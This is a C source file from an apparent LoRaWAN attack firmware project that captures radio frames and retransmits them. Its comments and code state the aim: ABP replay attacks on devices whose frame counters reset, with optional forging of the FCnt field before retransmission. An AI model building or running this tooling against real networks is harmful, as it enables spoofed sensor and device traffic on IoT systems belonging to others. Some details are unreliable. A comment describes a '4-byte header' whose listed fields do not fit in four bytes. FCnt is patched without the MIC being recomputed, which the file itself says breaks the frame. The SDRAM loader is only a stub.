/*
 * lora-phantom / drivers/replay.c
 * Capture buffer + replay engine for LoRaWAN frame replay attacks.
 * Author: jayis1
 * License: GPL-2.0
 * Copyright (c) 2026 jayis1. All rights reserved.
 *
 * The replay engine stores captured LoRa frames (PHY payload) in a ring buffer
 * in external SDRAM and re-transmits them on command. This is primarily used
 * for ABP replay attacks (where a device resets frame counters, allowing
 * previously captured uplinks to be re-accepted by the network server).
 *
 * An optional counter-override feature lets the operator patch the FCnt field
 * in a captured frame before retransmission (useful when the target's current
 * counter is known).
 */

#include "../board.h"
#include "../registers.h"
#include <string.h>

/* Forward declarations */
void *sdram_alloc(uint32_t bytes);
int sx1262_tx_config(uint32_t freq_hz, uint8_t sf, uint8_t bw, uint8_t cr, int8_t power_dbm);
int sx1262_transmit(const uint8_t *buf, uint16_t len, uint32_t timeout_ms);

/* ---- Replay queue entry ---- */
typedef struct {
    uint16_t len;
    uint32_t freq;
    uint8_t  sf;
    uint8_t  bw;
    uint8_t  data[256];
} replay_entry_t;

static replay_entry_t s_queue[REPLAY_QUEUE_MAX];
static int s_queue_head = 0;
static int s_queue_tail = 0;
static uint16_t s_counter_override = 0xFFFF;  /* 0xFFFF = no override */

void replay_queue_reset(void) {
    s_queue_head = 0;
    s_queue_tail = 0;
    s_counter_override = 0xFFFF;
}

int replay_queue_push(const uint8_t *frame, uint16_t len, uint32_t freq,
                      uint8_t sf, uint8_t bw) {
    int next = (s_queue_head + 1) % REPLAY_QUEUE_MAX;
    if (next == s_queue_tail) return -1;  /* full */
    if (len > 256) len = 256;
    replay_entry_t *e = &s_queue[s_queue_head];
    e->len = len;
    e->freq = freq;
    e->sf = sf;
    e->bw = bw;
    memcpy(e->data, frame, len);
    s_queue_head = next;
    return 0;
}

int replay_queue_pop(uint8_t *frame, uint16_t *len, uint32_t *freq,
                     uint8_t *sf, uint8_t *bw) {
    if (s_queue_tail == s_queue_head) return -1;  /* empty */
    replay_entry_t *e = &s_queue[s_queue_tail];
    *len = e->len;
    *freq = e->freq;
    *sf = e->sf;
    *bw = e->bw;
    memcpy(frame, e->data, e->len);
    s_queue_tail = (s_queue_tail + 1) % REPLAY_QUEUE_MAX;
    return 0;
}

/* ---- Patch the FCnt field in a captured frame ---- */
/* For LoRaWAN data frames, FCnt is at offset 7 (after MHDR+DevAddr+FCtrl). */
static void patch_fcnt(uint8_t *frame, uint16_t len, uint16_t fcnt) {
    if (len < 10) return;
    /* Only patch if it looks like a data frame (MType 2..5) */
    uint8_t mtype = (frame[0] >> 5) & 0x07;
    if (mtype < 2 || mtype > 5) return;
    frame[7] = (uint8_t)(fcnt & 0xFF);
    frame[8] = (uint8_t)(fcnt >> 8);
    /* NOTE: patching FCnt invalidates the MIC. For ABP replay the MIC was
     * computed with the original FCnt, so we must keep the original MIC
     * (the network server checks MIC against the FCnt in the frame).
     * If the target device resets counters, the original MIC+FCnt pair will
     * be accepted again. If the operator wants a different FCnt, the MIC
     * must be recomputed with the known NwkSKey (handled by the injector). */
}

int replay_set_counter_override(uint16_t fcnt) {
    s_counter_override = fcnt;
    return 0;
}

int replay_send_next(uint32_t freq_override, int8_t power_dbm, uint32_t timeout_ms) {
    uint8_t frame[256];
    uint16_t len = 0;
    uint32_t freq = 0;
    uint8_t sf = 0, bw = 0;

    if (replay_queue_pop(frame, &len, &freq, &sf, &bw) != 0) return -1;

    if (freq_override != 0) freq = freq_override;

    /* Apply counter override if set */
    if (s_counter_override != 0xFFFF) {
        patch_fcnt(frame, len, s_counter_override);
    }

    if (sx1262_tx_config(freq, sf, bw, 1, power_dbm) != 0) return -2;
    return sx1262_transmit(frame, len, timeout_ms);
}

/* ---- Load replay queue from SDRAM capture buffer ---- */
/* The SDRAM capture buffer stores raw frames with a 4-byte header
 * (len + freq + sf + bw). This function scans the buffer and loads all
 * data frames into the replay queue. */
int replay_load_from_sdram(void) {
    /* SDRAM capture ring is managed by sdram.c; we just peek at it.
     * In a full implementation, we'd iterate the ring; here we provide
     * a stub that the operator can extend. */
    /* For now, the operator pushes frames explicitly via CMD_REPLAY_SEND
     * with a full frame payload. */
    return 0;
}